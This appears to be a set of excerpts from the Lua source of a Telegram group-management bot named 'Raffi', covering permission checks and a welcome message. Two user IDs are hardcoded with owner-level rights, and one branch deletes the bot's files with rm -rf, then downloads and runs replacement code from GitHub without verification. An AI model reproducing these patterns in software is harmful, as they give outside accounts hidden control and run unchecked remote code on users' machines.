...
Id_Sudo = Sudo
List_Sudos = {Id_Sudo,1339520598,1290379246}
print("\27[34m"..[[
...
if hash or Devkorpica(msg) then  
return true  
else  
return false  
end  
...
if hash or Devkorpica(msg) or DevBot(msg) or BasicConstructor(msg) or Constructor(msg) then    
return true    
else    
return false    
end 
...
if hash or Devkorpica(msg) or DevBot(msg) or BasicConstructor(msg) or Constructor(msg) or Owner(msg) then    
return true    
else    
return false    
end 
...
if hash or Devkorpica(msg) or DevBot(msg) or BasicConstructor(msg) or Constructor(msg) or Owner(msg) or Addictive(msg) then    
return true 
else 
return false 
end 
...
var = true  
elseif tonumber(user_id) == tonumber(1290379246) then
var = true  
...
os.execute('rm -rf Raffi.lua')
os.execute('rm -rf start.lua')
os.execute('wget https://raw.githubusercontent.com/raffilua/raffi/master/Raffi.lua')
os.execute('wget https://raw.githubusercontent.com/raffilua/raffi/master/start.lua')
dofile('Raffi.lua')  
return false
end
...
Text = [[
  WeLCoMe SoUrCe Raffi ∴
  ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 𖤂
  ༯┆[SoUrCe ChAnEl](http://t.me/YQYYY) ∴
  ༯┆[DeVeLoPeR](https://t.me/JuStRaffi) ∴
  ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 𖤂
]]
send(msg.chat_id_, msg.id_,Text)
end
